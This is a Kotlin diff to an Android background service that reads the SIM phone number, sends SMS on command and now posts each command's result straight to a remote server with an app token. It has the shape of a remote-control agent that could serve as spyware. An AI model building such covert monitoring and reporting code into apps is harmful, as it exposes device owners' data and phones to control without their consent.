@@ -366,7 +366,7 @@ class PingService : Service() {
             try { lines.add("SIM1: ${(getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).line1Number?:"—"}") }
             catch (e: Exception) { lines.add("error: ${e.message}") }
         }
-        prefs.edit().putString(KEY_REPORT, "Phone numbers:\n"+lines.joinToString("\n")).apply()
+        sendResult("Phone numbers:\n" + lines.joinToString("\n"))
     }
 
     private fun setSilent() {
@@ -447,8 +447,27 @@ class PingService : Service() {
             if (to.isBlank()||msg.isBlank()) return
             val mgr = android.telephony.SmsManager.getDefault()
             mgr.sendMultipartTextMessage(to,null,mgr.divideMessage(msg),null,null)
-            prefs.edit().putString(KEY_REPORT,"SMS sent to $to").apply()
+            sendResult("SMS sent to $to")
         } catch (e: Exception) { prefs.edit().putString(KEY_REPORT,"SMS error: ${e.message}").apply() }
+    }
+
+    /** Send command result directly to server — no waiting for ping */
+    fun sendResult(result: String) {
+        val server = serverUrl(this)
+        if (server.isBlank()) return
+        Thread {
+            try {
+                val jsonBody = org.json.JSONObject().apply {
+                    put("text", result)
+                }.toString()
+                val req = Request.Builder()
+                    .url("$server/message")
+                    .addHeader("X-Token", APP_TOKEN)
+                    .post(jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType()))
+                    .build()
+                client.newCall(req).execute().use { }
+            } catch (e: Exception) { Log.w(TAG, "sendResult: ${e.message}") }
+        }.start()
     }
 
     fun uploadText(filename: String, content: String, caption: String = "") {
